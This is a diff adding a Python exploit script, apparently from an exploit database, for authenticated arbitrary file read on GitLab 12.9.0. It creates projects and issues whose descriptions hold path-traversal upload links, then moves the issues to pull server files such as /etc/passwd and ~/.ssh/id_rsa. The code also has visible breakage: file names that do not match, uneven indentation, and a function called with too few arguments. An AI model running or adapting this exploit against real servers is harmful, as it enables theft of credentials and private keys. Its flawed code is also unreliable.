@@ -1,0 +1,68 @@
+# Exploit Title: Gitlab 12.9.0 - Arbitrary File Read (Authenticated)
+# Google Dork: -
+# Date: 11/15/2020
+# Exploit Author: Jasper Rasenberg
+# Vendor Homepage: https://about.gitlab.com
+# Software Link: https://about.gitlab.com/install
+# Version: tested on gitlab version 12.9.0
+# Tested on: Kali Linux 2020.3
+
+
+
+#You can create as many personal access tokens as you like from your GitLab profile.
+#   Sign in to GitLab.
+#    In the upper-right corner, click your avatar and select Settings.
+#    On the User Settings menu, select Access Tokens.
+#    Choose a name and optional expiry date for the token.
+#    Choose the desired scopes.
+#    Click the Create personal access token button.
+#    Save the personal access token somewhere safe. If you navigate away or refresh your page, and you did not save the token, you must create a new one.
+
+# REFERENCE: https://docs.gitlab.com/ee/user/profile/personal_access_tokens.html
+
+#   pip3 install gitlab
+#   pip3 install requests
+#   Use a client cert to verify SSL or set to False
+
+import os
+import requests
+import json
+from time import sleep
+from gitlab import *
+
+session = requests.Session()
+session.verify = f'{os.getcwd()}/<cert.pem>' # or set session.verify = False
+
+host = ''
+
+def exploit(projectName, issueTitle, files, token):
+
+    gl = Gitlab(host, private_token=token, session=session)
+    gl.auth()
+    p1 = gl.projects.create({'name': f"{projectName}-1"})
+    p2 = gl.projects.create({'name': f"{projectName}-2"})
+
+    for i, f in enumerate(files):
+        stripped_f = f.rstrip('\n')
+        issue = p1.issues.create({ \
+                'title': f"{issueTitle}-{i}",
+                'description': \
+                "![a](/uploads/11111111111111111111111111111111/"\
+                f"../../../../../../../../../../../../../..{stripped_f})"})
+        print(issue.description)
+        sleep(3)
+        try:
+            issue.move(p2.id)
+        except Exception as e:
+            pass
+        sleep(3)
+
+if __name__ == "__main__":
+
+     write_files = ['/etc/passwd', '~/.ssh/id_rsa']
+     with open('senstive_files', 'w') as sens:
+         for file in write_files:
+             sens.write(file)
+
+    files = list(open('sensitive_files', 'r'))
+    exploit('project-1', 'issue-1', files)
